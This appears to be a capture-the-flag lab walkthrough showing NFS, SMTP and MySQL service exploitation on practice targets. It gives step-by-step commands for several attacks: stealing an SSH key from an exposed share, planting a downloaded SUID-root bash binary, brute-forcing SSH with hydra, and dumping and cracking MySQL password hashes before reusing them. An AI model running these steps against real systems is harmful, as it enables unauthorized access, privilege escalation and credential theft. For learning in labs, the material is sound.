
## NFS Exploit

#### Enumeration

- First step is Enumeration, run an nmap scan :
  `$ nmap -A -p- [IP] -vv` - takes a long time and scans all ports
  `$ nmap -sC [IP] -vv` - takes less time but will not scan all ports 
  so we find `7` open ports and the port that has `NFS` protocol is `2049` 
- make sure you have `nfs-common` module installed (`sudo apt install nfs-common`)
   now run the command `$ showmount -e [IP]` to show the name of shares which is `/home` 
- now do `mkdir /tmp/mount` - create a new directory called mount in /tmp (keep in mind that on restarting the mount will be lost because /tmp acts as `cache memory`)
- now mount the /home into /tmp/mount by running the command :
	`$ sudo mount -t nfs [IP]:/home /tmp/mount` - /home is share name
- once its mounted and we go into /mount we can see a new folder is created called `cappucino` which looks like a user's home directory 
- we find a `.ssh` folder containing `id_rsa` so we can login through ssh by doing 
	`$ ssh -i id_rsa cappucino@[IP]` 
#### Exploiting NFS

*MAP*
```
NFS Access ->
        Gain Low Privilege Shell ->
            Upload Bash Executable to the NFS share ->
                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->
                    Login through SSH ->
                        Execute SUID Bit Bash Executable ->
                            ROOT ACCESS
```

- now change directory to where we mounted the share and here we need to download the `bash shell executable` from [bash](https://github.com/polo-sec/writing/tree/master/Security%20Challenge%20Walkthroughs/Networks%202) by doing wget.
- the bash shell should be owned by root user so do `$ sudo chown root bash` 
- now to add SUID bit permission to bash executable , we do `$ sudo chmod +s bash` followed by `$ sudo chmod +x bash` 
- now ssh into the user by doing `$ ssh -i id_rsa cappucino@[IP]` and do ls and see if bash is there
- now run it as `$ ./bash -p` and we get the FLAG
---
### SMTP Exploit

#### Enumeration

- First we run nmap scan on target IP as `$ nmap -sC [IP] -vv` , we see 2 open ports and SMTP running on port 25.
- here metasploit comes in clutch because it has a module `smtp_enum` which just takes host, wordlist as parameters and does the work for us.
- from cmd line we can access with `msfconsole` 
> `search smtp_enum`
> `use 0` 
> `options`
> `set RHOST [IP]`
> `set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt`
> `run` 

- with these commands the module takes like a minute and finds the valid username - `administrator` 

#### Exploiting SMTP

- now we have username, and from port scan we know that the only other open port is an ssh login, so we try to `bruteforce` the password for ssh login using `hydra`.
- `hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV [IP] ssh`
- we get password as `alejandro`
- then do ssh login by `ssh administrator@[IP]` and `cat smtp.txt`.
---

### MySQL Exploit

#### Enumeration

- first do `sudo apt install default-mysql-client` , lets assume we found credentials `"root:password"` after enumerating sub-domains of a server and had unsuccessful attempts at ssh login.
- so now we try it against `mysql`, so run nmap scan `$ nmap -sC -sV [IP] -vv` , we see port `3306` is running mysql server.
- let's double check the credentials by manually connecting to mysql server by `$ mysql -h [IP] -u root -p` and now when prompted to enter password, enter `password` and it is successfully connected to mysql server.
- now launch up `msfconsole` which is basically `metasploit` and do
> `search mysql_sql`
> `use 0`
> `options`
> `set username root` , `set password password` 
> `set RHOSTS [IP]`
> `set sql show databases`
> `run` - shows 4 databases

#### Exploiting MySQL

- first in `msfconsole` search for module `mysql_schemadump` and set the relevant options i.e the credentials and RHOST and run it, we see all the table names.
- now we use `mysql_hashdump` module and set the relevant options and run it and we see a non-default user called `carl` which can be a username and beside it is a hash in the format `carl:*EA45SF3276DGHT blah blah` .
- save this in local directory as `hash.txt` and crack this hash using `john the ripper` by doing :
	`$ john hash.txt` - hence password obtained is `doggie` 
- what are the chances that this user has reused passwords for a different service?
	pretty much possible so let's try doing an ssh login with these credentials
	`$ ssh carl@[IP]` and when prompted for password: `doggie` and do ls and print the flag from `MySQL.txt` 
---
